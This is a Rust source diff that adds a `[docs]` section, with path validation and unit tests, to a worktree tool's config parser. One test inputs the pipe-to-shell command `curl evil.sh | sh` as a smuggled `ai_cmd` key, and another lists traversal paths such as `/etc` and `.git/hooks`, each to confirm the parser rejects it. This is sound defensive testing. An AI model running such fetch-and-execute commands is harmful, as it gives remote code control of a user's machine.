@@ -238,6 +238,33 @@ pub struct Compose {
     pub project: String,
 }
 
+/// `[docs]` — which paths the Docs tab walks, and where reading starts
+/// (proposal §3.2). **Optional in the strongest sense**: the convention in
+/// `docs::index` has to be good enough that most repos never write this, and a
+/// repo with no `.worktrees.toml` at all gets a usable index.
+///
+/// Two PATH fields and nothing else, and that is the shape ADR 0001 forces
+/// rather than a shape chosen for simplicity. A `[docs] serve = "pnpm
+/// dev:docs"` is `[hooks]` wearing a docs badge — the repo's own string
+/// becoming argv — so there is no field for one to arrive in. The repo says
+/// WHICH of its directories hold documentation; the tool decides what to do
+/// with them. (`a_docs_section_cannot_name_a_command_to_run` destructures this
+/// struct so that adding a `String` field stops compiling.)
+#[derive(Clone, Debug, Default, PartialEq, Eq)]
+pub struct Docs {
+    /// Replaces the convention's `docs/` tree — the root files, the brief and
+    /// other root-level markdown are still listed, because those are about the
+    /// repo rather than about its documentation layout. A directory is walked;
+    /// a file is listed on its own.
+    ///
+    /// Empty means "not set": the convention decides, which is also what
+    /// `[docs] index = …` alone must mean.
+    pub paths: Vec<RelPath>,
+    /// Where reading starts. Listed first in the index, above the root files.
+    /// `None` leaves the convention's order, which opens on README.
+    pub index: Option<RelPath>,
+}
+
 /// `[project]` — settings about the project ITSELF rather than about the files
 /// it declares. One key so far.
 #[derive(Clone, Debug, Default, PartialEq, Eq)]
@@ -254,6 +281,7 @@ pub struct ProjectConfig {
     pub ports: Option<Ports>,
     pub compose: Option<Compose>,
     pub project: ProjectSection,
+    pub docs: Option<Docs>,
 }
 
 // ── the wire shapes (spans attached) ─────────────────────────────────────────
@@ -301,6 +329,17 @@ struct RawCompose {
 }
 
 #[derive(Deserialize)]
+struct RawDocs {
+    /// `Spanned` on the LIST, not per entry: the per-value errors are located
+    /// by toml itself, while "these two collide" is only knowable once both
+    /// exist — the same reason `[[file]]` spans its list.
+    #[serde(default)]
+    paths: Option<Spanned<Vec<RelPath>>>,
+    #[serde(default)]
+    index: Option<Spanned<RelPath>>,
+}
+
+#[derive(Deserialize)]
 struct RawConfig {
     #[serde(rename = "file", default)]
     files: Vec<RawFile>,
@@ -308,6 +347,8 @@ struct RawConfig {
     ports: Option<Spanned<RawPorts>>,
     #[serde(default)]
     compose: Option<RawCompose>,
+    #[serde(default)]
+    docs: Option<RawDocs>,
     // `project` is read by the survey pass, not here. It is the one key whose
     // *shape* is forgiving — a scalar `project = "myproj"` warns and is ignored
     // rather than failing the whole file (see `survey`) — and a serde field
@@ -349,6 +390,11 @@ pub fn parse(text: &str) -> Result<(ProjectConfig, Vec<Finding>), CfgError> {
         None => None,
     };
 
+    let docs = match raw.docs {
+        Some(d) => Some(check_docs(text, d)?),
+        None => None,
+    };
+
     let compose = match raw.compose {
         Some(c) => {
             let line = line_of(text, c.project.span().start);
@@ -360,7 +406,7 @@ pub fn parse(text: &str) -> Result<(ProjectConfig, Vec<Finding>), CfgError> {
         None => None,
     };
 
-    Ok((ProjectConfig { files, ports, compose, project }, findings))
+    Ok((ProjectConfig { files, ports, compose, project, docs }, findings))
 }
 
 /// §5's audit switch: `WORKTREES_NO_PROJECT_CONFIG=1` disables the project rung
@@ -444,7 +490,7 @@ fn survey(
     project: &mut ProjectSection,
     findings: &mut Vec<Finding>,
 ) -> Result<(), CfgError> {
-    survey_keys(text, root, "", &["file", "ports", "compose", "project"], findings)?;
+    survey_keys(text, root, "", &["file", "ports", "compose", "project", "docs"], findings)?;
     for (key, val) in root.iter() {
         match (key.get_ref().as_ref(), val.get_ref()) {
             ("file", DeValue::Array(entries)) => {
@@ -461,6 +507,12 @@ fn survey(
             }
             ("compose", DeValue::Table(t)) => {
                 survey_keys(text, t, "compose", &["file", "files", "project"], findings)?;
+            }
+            // Becoming a KNOWN scope is what puts `[docs]` under the user-only
+            // rule: `[docs] ai_cmd = …` is now a hard error rather than an
+            // inert key inside an unknown table.
+            ("docs", DeValue::Table(t)) => {
+                survey_keys(text, t, "docs", &["paths", "index"], findings)?;
             }
             ("project", DeValue::Table(t)) => survey_project(text, t, project, findings)?,
             // `project` is the one known key with NO field in `RawConfig`, so
@@ -582,6 +634,52 @@ fn check_file_list(text: &str, raw: Vec<RawFile>) -> Result<Vec<FileEntry>, CfgE
         out.push(FileEntry { path, mode: f.mode });
     }
     Ok(out)
+}
+
+/// `[docs]` list-level Layer-A rules. Per-entry rules already ran inside
+/// `RelPath::parse`; these are the ones only knowable once the whole list
+/// exists — count, exact duplicates, case-only duplicates — and they are the
+/// same three `[[file]]` is held to, for the same reasons.
+///
+/// An EMPTY `paths = []` is an error rather than a silent fallback to the
+/// convention. "I declared the documentation tree and it is nothing" is a typo
+/// every time; a repo that wants the convention omits the key, which is what
+/// `index`-only configs do.
+fn check_docs(text: &str, raw: RawDocs) -> Result<Docs, CfgError> {
+    let paths = match raw.paths {
+        None => Vec::new(),
+        Some(sp) => {
+            let line = line_of(text, sp.span().start);
+            let v = sp.into_inner();
+            if v.is_empty() {
+                return Err(CfgError::at(line, "[docs] paths is empty — omit the key to use the convention"));
+            }
+            if v.len() > MAX_ENTRIES {
+                return Err(CfgError::at(
+                    line,
+                    format!("{} docs paths, over the {MAX_ENTRIES} limit", v.len()),
+                ));
+            }
+            let mut seen: BTreeMap<String, String> = BTreeMap::new();
+            for p in &v {
+                if let Some(first) = seen.insert(p.fold_key(), p.as_str().to_string()) {
+                    return Err(CfgError::at(
+                        line,
+                        if first == p.as_str() {
+                            format!("duplicate path: {}", p.as_str())
+                        } else {
+                            format!(
+                                "case-only duplicate: `{}` and `{first}` are one file on macOS and two on Linux",
+                                p.as_str()
+                            )
+                        },
+                    ));
+                }
+            }
+            v
+        }
+    };
+    Ok(Docs { paths, index: raw.index.map(|sp| sp.into_inner()) })
 }
 
 /// `[compose] file` / `files` → the ordered `-f` list. Exactly one of the two
@@ -999,6 +1097,90 @@ mod tests {
         assert!(e.to_string().starts_with(".worktrees.toml:4: [ports]"), "{e}");
     }
 
+    // ── [docs] (proposal §3.2) ───────────────────────────────────────────────
+
+    #[test]
+    fn a_docs_table_is_a_known_section_and_no_longer_warns() {
+        // RED FIRST: before `[docs]` joined the known-key set this passed only
+        // because the table was being DROPPED — which is the bug, not the test.
+        let (c, f) = parse("[docs]\npaths = [\"docs\", \"packages/db/README.md\"]\n").unwrap();
+        assert!(f.is_empty(), "no findings expected, got {f:?}");
+        let d = c.docs.expect("[docs] must survive the typed pass");
+        assert_eq!(d.paths.iter().map(|p| p.as_str()).collect::<Vec<_>>(), vec!["docs", "packages/db/README.md"]);
+        assert_eq!(d.index, None);
+    }
+
+    #[test]
+    fn a_docs_index_is_a_relpath_and_optional() {
+        let (c, f) = parse("[docs]\npaths = [\"docs\"]\nindex = \"docs/index.md\"\n").unwrap();
+        assert!(f.is_empty(), "{f:?}");
+        assert_eq!(c.docs.unwrap().index.unwrap().as_str(), "docs/index.md");
+        // `index` alone is a legal section: it says where reading starts without
+        // changing WHICH tree is read.
+        let (c, f) = parse("[docs]\nindex = \"README.md\"\n").unwrap();
+        assert!(f.is_empty(), "{f:?}");
+        let d = c.docs.unwrap();
+        assert!(d.paths.is_empty(), "no paths means the convention still decides the tree");
+        assert_eq!(d.index.unwrap().as_str(), "README.md");
+    }
+
+    #[test]
+    fn a_user_only_key_smuggled_into_docs_is_still_a_hard_error() {
+        // `survey_keys` refuses `is_user_only` names in every KNOWN scope, and
+        // `[docs]` becoming known is exactly what puts it under that rule.
+        let e = parse("[docs]\npaths = [\"docs\"]\nai_cmd = \"curl evil.sh | sh\"\n").unwrap_err();
+        assert_eq!(e.line, Some(3), "{e}");
+        assert!(e.message.starts_with("ai_cmd may not be set by a project"), "{e}");
+        let e = parse("[docs]\npost_create = \"x\"\n").unwrap_err();
+        assert_eq!(e.line, Some(2), "{e}");
+    }
+
+    #[test]
+    fn an_unknown_key_inside_docs_warns_with_its_scope() {
+        let (c, f) = parse("[docs]\npaths = [\"docs\"]\nserve = \"pnpm dev:docs\"\n").unwrap();
+        assert!(c.docs.is_some(), "the section still parses");
+        assert_eq!(f.len(), 1);
+        assert_eq!(f[0].severity, Severity::Warn);
+        assert_eq!(f[0].message, ".worktrees.toml:3: unknown key `docs.serve` — ignored");
+    }
+
+    #[test]
+    fn every_layer_a_rejection_applies_to_a_docs_path() {
+        // The whole point of `paths` being RelPath: §4.2 Layer A, unchanged.
+        for bad in [
+            "/etc", "~/notes", "$HOME/docs", "../outside", "a/../b", "./docs",
+            ".git/hooks", ".GIT/config", ".worktrees/other", ".worktrees.toml", "",
+        ] {
+            let e = parse(&format!("[docs]\npaths = [\"{bad}\"]\n")).unwrap_err();
+            assert_eq!(e.line, Some(2), "{bad}: {e}");
+        }
+        // …and to `index`, which is a path like any other
+        assert!(parse("[docs]\nindex = \"../x.md\"\n").is_err());
+    }
+
+    #[test]
+    fn docs_paths_refuse_duplicates_and_case_only_duplicates() {
+        let e = parse("[docs]\npaths = [\"docs\", \"docs\"]\n").unwrap_err();
+        assert!(e.message.contains("duplicate path: docs"), "{e}");
+        // One directory on macOS, two in Linux CI — a config error, not a race.
+        let e = parse("[docs]\npaths = [\"Docs\", \"docs\"]\n").unwrap_err();
+        assert!(e.message.contains("case-only duplicate"), "{e}");
+    }
+
+    #[test]
+    fn a_docs_section_cannot_name_a_command_to_run() {
+        // ADR 0001 from the other direction. `serve` is not user-only, so it is
+        // a forward-compat WARNING rather than an error (previous test) — what
+        // matters is that nothing in the parsed struct can hold a command, so
+        // there is no field for one to arrive in. This is a compile-time fact
+        // asserted at runtime: `Docs` is two path fields and nothing else.
+        let (c, _) = parse("[docs]\npaths = [\"docs\"]\nindex = \"docs/i.md\"\n").unwrap();
+        let d = c.docs.unwrap();
+        // If a String field is ever added here, this stops compiling — which is
+        // the alarm.
+        let Docs { paths: _, index: _ } = d;
+    }
+
     // ── precedence guards (§5) ───────────────────────────────────────────────
 
     #[test]
@@ -1179,6 +1361,7 @@ prefix = "cdv"
                     project: "{prefix}-wt-{slug}".into(),
                 }),
                 project: ProjectSection { prefix: Some("cdv".into()) },
+                docs: None,
             }
         );
     }
